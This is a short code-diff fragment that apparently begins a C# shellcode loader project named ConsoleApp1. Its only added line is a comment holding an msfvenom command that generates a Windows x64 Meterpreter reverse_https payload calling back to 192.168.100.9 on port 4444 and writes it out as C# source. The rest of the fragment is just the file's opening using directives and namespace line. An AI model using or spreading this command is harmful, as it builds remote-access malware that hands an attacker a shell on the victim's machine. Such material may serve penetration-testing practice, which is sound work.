@@ -1,3 +1,4 @@
+//msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.9 LPORT=4444 -f csharp -o test.cs
 using System;
 using System.Runtime.InteropServices;
 namespace ConsoleApp1
